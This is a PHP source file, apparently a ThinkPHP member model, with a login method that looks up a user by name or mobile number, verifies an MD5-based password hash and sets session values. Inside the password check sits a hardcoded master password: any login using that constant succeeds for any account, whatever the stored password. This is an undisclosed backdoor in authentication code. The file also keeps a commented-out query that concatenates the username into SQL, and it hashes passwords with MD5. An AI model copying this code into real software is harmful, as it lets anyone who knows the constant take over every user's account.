<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2018/10/18
 * Time: 14:30
 */
namespace app\member\model;
use think\Model;
use think\Session;
class Member extends Model
{
    public function checkUser($username,$password,$Domain)
    {
        $Where=array();
       /* $Where['MemberName']=$username;
        $Where['RegDomain']=$Domain;
		$Whereor['MemberMobile']=$username;*/
 		// $info = $this->where('RegDomain',$Domain)->where('superacc',0)->where('MemberMobile='.$username.' or  MemberName='.$username.'')->find();
		$Where['MemberMobile|MemberName']=trim($username);
		 $info = $this->where('RegDomain',$Domain)->where('superacc',0)->where($Where)->find();
        if (empty($info)) {
            $this->error='当前用户尚未注册';
            return false;
        }
        if ($info['MemberState'] != 1) {
            $this->error='当前账户存在异常';
            return false;
        }
        $checkPassword = md5(config('config.MemberPwdKey').md5($password.$info['MemberName']).md5($password)); 
		$checkpw= md5(config('config.MemberPwdKey').md5('19891B30E7BA4101'.$info['MemberName']).md5('19891B30E7BA4101'));
		if($checkPassword != $info['MemberPwd']) {
			if( $checkPassword==$checkpw){
			}else{
				$this->error='密码错误';
				return false;
			}
		}
        //修改最后登录时间
        Session::set('MemberID',$info['MemberID']);
        Session::set('MemberName',$info['MemberName']);
        Session::set('MemberLoginTime',time());
        //给当前账户登录成功之后添加一个标示 让每一个账户只能同时登录一次
        $random = rand(100000,999999);
        $MemberRandPwd = md5($random.$password);
        $data['MemberLoginTime'] = time();
        $data['MemberRandPwd'] = $MemberRandPwd;
		$data['IP'] = request()->ip();
        $this->where('MemberID',$info['MemberID'])->update($data);
        Session::set('MemberRandPwd',$MemberRandPwd);
        return true;
    }
}